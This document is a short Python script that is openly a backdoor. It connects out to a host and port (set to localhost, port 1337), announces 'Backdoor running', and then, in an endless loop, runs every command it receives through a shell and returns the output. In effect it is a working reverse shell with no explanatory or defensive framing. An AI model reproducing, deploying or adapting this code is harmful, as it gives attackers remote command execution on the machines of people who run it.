import socket
import subprocess


host = "127.0.0.1"
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send("Backdoor running")

while True:
    data = s.recv(256)
    procn = subprocess.Popen(str(data), shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
    stdout = procn.stdout.read()
    s.send(stdout)